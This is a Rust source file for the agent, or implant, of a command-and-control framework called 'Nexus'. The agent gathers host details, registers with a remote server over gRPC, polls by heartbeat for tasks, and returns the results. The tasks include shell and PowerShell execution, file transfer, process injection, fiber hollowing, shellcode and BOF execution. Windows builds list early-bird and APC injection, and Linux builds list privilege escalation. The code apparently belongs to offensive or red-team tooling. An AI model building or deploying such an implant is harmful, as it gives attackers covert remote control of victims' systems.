use crate::communication::NetworkClient;
use crate::execution::TaskExecutor;
use crate::system::SystemInfo;
use nexus_common::*;
use std::time::Duration;
use tokio::time::timeout;

pub struct NexusAgent {
    id: Option<String>,
    server_addr: String,
    crypto: Crypto,
    network_client: NetworkClient,
    task_executor: TaskExecutor,
    system_info: SystemInfo,
    capabilities: Vec<String>,
    last_heartbeat: u64,
    registered: bool,
}

impl NexusAgent {
    pub async fn new(server_addr: String, encryption_key: [u8; 32]) -> Result<Self> {
        let crypto = Crypto::new(encryption_key);
        let network_client = NetworkClient::new(server_addr.clone());
        let task_executor = TaskExecutor::new();
        let system_info = SystemInfo::collect().await?;

        // Determine agent capabilities based on OS and compilation features
        let mut capabilities = vec![
            "shell_execution".to_string(),
            "file_operations".to_string(),
            "network_operations".to_string(),
        ];

        #[cfg(target_os = "windows")]
        {
            capabilities.push("registry_operations".to_string());
            capabilities.push("service_control".to_string());
            capabilities.push("process_injection".to_string());
            capabilities.push("shellcode_execution".to_string());
            capabilities.push("fiber_execution".to_string());
            capabilities.push("fiber_hollowing".to_string());
            capabilities.push("early_bird_injection".to_string());
            capabilities.push("apc_injection".to_string());
        }

        #[cfg(target_os = "linux")]
        {
            capabilities.push("privilege_escalation".to_string());
            capabilities.push("process_monitoring".to_string());
        }

        Ok(Self {
            id: None,
            server_addr,
            crypto,
            network_client,
            task_executor,
            system_info,
            capabilities,
            last_heartbeat: 0,
            registered: false,
        })
    }

    pub async fn run_cycle(&mut self) -> Result<()> {
        #[cfg(debug_assertions)]
        println!("Starting agent run cycle...");

        // Register if not already registered
        if !self.registered {
            #[cfg(debug_assertions)]
            println!("Agent not registered, attempting registration...");
            self.register().await?;
        } else {
            #[cfg(debug_assertions)]
            println!("Agent already registered, proceeding to heartbeat...");
        }

        // Send heartbeat and check for tasks
        #[cfg(debug_assertions)]
        println!("Sending heartbeat and checking for tasks...");
        let tasks = self.heartbeat().await?;

        #[cfg(debug_assertions)]
        println!("Received {} tasks", tasks.len());

        // Execute any received tasks
        for task_data in tasks {
            if let Err(e) = self.execute_task(task_data).await {
                #[cfg(debug_assertions)]
                eprintln!("Task execution error: {}", e);
            }
        }

        #[cfg(debug_assertions)]
        println!("Agent run cycle completed successfully");

        Ok(())
    }

    async fn register(&mut self) -> Result<()> {
        let registration_data = RegistrationData {
            hostname: self.system_info.hostname.clone(),
            os_type: self.system_info.os_name.clone(),
            os_version: self.system_info.os_version.clone(),
            ip_address: self.system_info.primary_ip.clone(),
            username: self.system_info.username.clone(),
            process_id: self.system_info.process_id,
            process_name: self.system_info.process_name.clone(),
            architecture: self.system_info.architecture.clone(),
            capabilities: self.capabilities.clone(),
        };

        // Send registration via gRPC
        let agent_id = timeout(
            Duration::from_secs(30),
            self.network_client.register_agent(&registration_data),
        )
        .await??;

        self.id = Some(agent_id);
        self.registered = true;
        self.last_heartbeat = current_timestamp();

        #[cfg(debug_assertions)]
        println!(
            "Successfully registered with agent ID: {}",
            self.id.as_ref().unwrap()
        );

        Ok(())
    }

    async fn heartbeat(&mut self) -> Result<Vec<TaskData>> {
        let agent_id = self
            .id
            .as_ref()
            .ok_or_else(|| NexusError::AgentError("Agent not registered".to_string()))?;

        // Send heartbeat and get tasks via gRPC
        let grpc_tasks = timeout(
            Duration::from_secs(15),
            self.network_client.heartbeat(agent_id),
        )
        .await??;

        self.last_heartbeat = current_timestamp();

        // Convert gRPC tasks to internal TaskData format
        let mut tasks = Vec::new();
        for grpc_task in grpc_tasks {
            if let Ok(task_data) = self.convert_grpc_task_to_task_data(grpc_task) {
                tasks.push(task_data);
            }
        }

        Ok(tasks)
    }

    /// Convert gRPC Task to internal TaskData format
    fn convert_grpc_task_to_task_data(
        &self,
        grpc_task: crate::communication::nexus::v1::Task,
    ) -> Result<TaskData> {
        use crate::communication::nexus::v1::TaskType;

        let task_type = match TaskType::try_from(grpc_task.task_type) {
            Ok(TaskType::ShellCommand) => "shell_command",
            Ok(TaskType::PowershellCommand) => "powershell_command",
            Ok(TaskType::FileUpload) => "file_upload",
            Ok(TaskType::FileDownload) => "file_download",
            Ok(TaskType::DirectoryListing) => "directory_listing",
            Ok(TaskType::ProcessList) => "process_list",
            Ok(TaskType::SystemInfo) => "system_info",
            Ok(TaskType::NetworkInfo) => "network_info",
            Ok(TaskType::FiberShellcode) => "fiber_shellcode",
            Ok(TaskType::FiberHollowing) => "fiber_hollowing",
            Ok(TaskType::ProcessInjection) => "process_injection",
            Ok(TaskType::BofExecution) => "bof_execution",
            _ => "unknown",
        }
        .to_string();

        Ok(TaskData {
            task_id: grpc_task.task_id,
            task_type,
            command: grpc_task.command,
            parameters: grpc_task.parameters,
            timeout: Some(grpc_task.timeout_seconds as u64),
            priority: grpc_task.priority as u8,
        })
    }

    async fn execute_task(&mut self, task_data: TaskData) -> Result<()> {
        let start_time = current_timestamp();
        let task_id = task_data.task_id.clone();

        #[cfg(debug_assertions)]
        println!("Executing task: {} ({})", task_data.task_type, task_id);

        // Execute the task with timeout
        let task_timeout = task_data.timeout.unwrap_or(300);
        let result = timeout(
            Duration::from_secs(task_timeout),
            self.task_executor.execute_task(task_data),
        )
        .await;

        let task_result = match result {
            Ok(Ok(output)) => TaskResult::success(
                task_id.clone(),
                output,
                start_time,
            ),
            Ok(Err(e)) => TaskResult::failure(
                task_id.clone(),
                e.to_string(),
                start_time,
            ),
            Err(_) => {
                TaskResult::timeout(task_id.clone(), start_time)
            }
        };

        // Send task result back to server
        self.send_task_result(task_result).await?;

        Ok(())
    }

    async fn send_task_result(&mut self, task_result: TaskResult) -> Result<()> {
        let agent_id = self
            .id
            .as_ref()
            .ok_or_else(|| NexusError::AgentError("Agent not registered".to_string()))?;

        // Convert internal TaskResult to gRPC TaskResult
        let grpc_task_result = self.convert_task_result_to_grpc(task_result, agent_id)?;

        // Send via gRPC with timeout
        timeout(
            Duration::from_secs(15),
            self.network_client.submit_task_result(agent_id, grpc_task_result),
        )
        .await??;

        Ok(())
    }

    /// Convert internal TaskResult to gRPC TaskResult format
    fn convert_task_result_to_grpc(
        &self,
        task_result: TaskResult,
        agent_id: &str,
    ) -> Result<crate::communication::nexus::v1::TaskResult> {
        use crate::communication::nexus::v1::{TaskResult as GrpcTaskResult, TaskExecutionStatus};
        use prost_types::Timestamp;

        let status = match task_result.status {
            TaskStatus::Completed => TaskExecutionStatus::Completed as i32,
            TaskStatus::Failed => TaskExecutionStatus::Failed as i32,
            TaskStatus::Timeout => TaskExecutionStatus::Timeout as i32,
            TaskStatus::Running => TaskExecutionStatus::Running as i32,
            TaskStatus::Pending => TaskExecutionStatus::Pending as i32,
            TaskStatus::Cancelled => TaskExecutionStatus::Cancelled as i32,
        };

        let start_time = Some(Timestamp {
            seconds: task_result.start_time as i64,
            nanos: 0,
        });

        let end_time = Some(Timestamp {
            seconds: task_result.end_time as i64,
            nanos: 0,
        });

        Ok(GrpcTaskResult {
            task_id: task_result.task_id,
            agent_id: agent_id.to_string(),
            status,
            output: task_result.output,
            error_message: task_result.error_message.unwrap_or_default(),
            start_time,
            end_time,
            execution_duration_ms: task_result.execution_duration_ms,
            exit_code: task_result.exit_code.unwrap_or(0),
            artifacts: vec![], // Convert artifacts if needed in the future
        })
    }

    pub fn get_id(&self) -> Option<&String> {
        self.id.as_ref()
    }

    pub fn is_registered(&self) -> bool {
        self.registered
    }

    pub fn get_capabilities(&self) -> &[String] {
        &self.capabilities
    }

    pub fn add_capability(&mut self, capability: String) {
        if !self.capabilities.contains(&capability) {
            self.capabilities.push(capability);
        }
    }

    pub fn time_since_last_heartbeat(&self) -> u64 {
        current_timestamp() - self.last_heartbeat
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_agent_creation() {
        let server_addr = "127.0.0.1:4444".to_string();
        let key = [0u8; 32];

        let agent = NexusAgent::new(server_addr, key).await.unwrap();
        assert!(!agent.is_registered());
        assert!(agent.get_capabilities().len() > 0);
    }

    #[tokio::test]
    async fn test_agent_capabilities() {
        let server_addr = "127.0.0.1:4444".to_string();
        let key = [0u8; 32];

        let agent = NexusAgent::new(server_addr, key).await.unwrap();
        let capabilities = agent.get_capabilities();

        assert!(capabilities.contains(&"shell_execution".to_string()));
        assert!(capabilities.contains(&"file_operations".to_string()));
        assert!(capabilities.contains(&"network_operations".to_string()));

        #[cfg(target_os = "windows")]
        {
            assert!(capabilities.contains(&"fiber_execution".to_string()));
            assert!(capabilities.contains(&"process_injection".to_string()));
        }
    }
}
